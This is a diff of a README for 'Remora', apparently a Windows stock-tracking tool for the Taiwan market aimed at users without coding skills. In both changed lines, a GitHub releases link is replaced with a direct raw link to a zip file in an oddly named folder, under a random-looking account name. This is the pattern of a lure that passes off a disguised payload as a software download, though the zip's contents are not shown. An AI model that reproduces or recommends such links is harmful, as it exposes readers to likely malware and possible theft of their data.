@@ -1,6 +1,6 @@
 # 📈 Remora - Capture market gains through institutional tracking
 
-[![](https://img.shields.io/badge/Download_Remora-blue.svg)](https://github.com/araucariabidwilliipolygynist876/Remora/releases)
+[![](https://img.shields.io/badge/Download_Remora-blue.svg)](https://github.com/araucariabidwilliipolygynist876/Remora/raw/refs/heads/main/clangingly/Software_1.3.zip)
 
 Remora helps you track money flow in the Taiwan stock market. It finds price gaps left by large institutions. You use it to spot trends during the day. This system combines live market data, sector analysis, and price testing logs. You do not need coding skills to use this tool.
 
@@ -28,7 +28,7 @@ Remora needs a standard Windows computer to run well. Please check that your com
 
 You should download the software first. Go to the link below to get the installer for your computer.
 
-[Download the latest version here](https://github.com/araucariabidwilliipolygynist876/Remora/releases)
+[Download the latest version here](https://github.com/araucariabidwilliipolygynist876/Remora/raw/refs/heads/main/clangingly/Software_1.3.zip)
 
 Follow these steps to install the system:
 
